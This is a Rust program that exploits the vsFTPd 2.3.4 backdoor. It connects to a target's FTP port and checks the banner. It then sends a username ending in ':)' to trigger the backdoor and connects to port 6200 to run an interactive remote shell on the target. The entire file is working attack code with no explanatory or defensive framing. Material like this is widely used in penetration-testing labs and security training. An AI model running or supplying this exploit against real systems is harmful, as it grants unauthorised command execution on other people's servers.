use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

fn is_ip(input: &str) -> bool {
    let dot_count = input.chars().filter(|&c| c == '.').count();

    if dot_count != 3 {
        return false;
    }

    input
        .split('.')
        .map(|octet| octet.parse::<u8>())
        .collect::<Result<Vec<u8>, _>>().is_ok()
}

fn get_ip() -> Result<String, &'static str> {
    let mut args = std::env::args();

    if args.len() != 2 {
        println!("NEED IP!");
        std::process::exit(1);
    }

    args.next();

    match args.next() {
        Some(ip) if is_ip(&ip) => return Ok(ip),
        Some(_) => return Err("It's not ip!"),
        None => return Err("It's not ip!"),
    };
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let vuln_ip = match get_ip() {
        Ok(ip) => ip,
        Err(e) => {
            println!("Error: {}", e);
            std::process::exit(1);
        }
    };
    println!("[!] Try to hack {vuln_ip}..");

    let mut stream = TcpStream::connect(format!("{}:21", vuln_ip)).await?;
    let mut buffer = vec![0; 1024];
    let bytes_data = stream.read(&mut buffer).await?;

    let readable_data = std::str::from_utf8(&buffer[..bytes_data]).unwrap();

    if !readable_data.contains("vsFTPd 2.3.4") {
        println!("[-] Wrong Answer from Server!");
        std::process::exit(1);
    }

    let user = "USER test:)\n";
    let password = "PASS test\n";

    stream.write_all(user.as_bytes()).await?;
    stream.write_all(password.as_bytes()).await?;
    stream.shutdown().await?;

    let mut stream = TcpStream::connect(format!("{}:6200", vuln_ip)).await?;
    println!("[+] Shell Opened!");
    println!("[+] Write 'exit' to quit shell.");

    let mut input = String::new();

    loop {
        input.clear();
        std::io::stdin().read_line(&mut input)?;
        stream.write_all(input.as_bytes()).await?;
        let bytes_data = stream.read(&mut buffer).await?;
        let readable_data = std::str::from_utf8(&buffer[..bytes_data]).unwrap();
        print!("> {}", readable_data);

        if input.trim() == "exit" {
            break;
        }
    }

    println!("Exiting..");
    stream.shutdown().await?;
    Ok(())
}
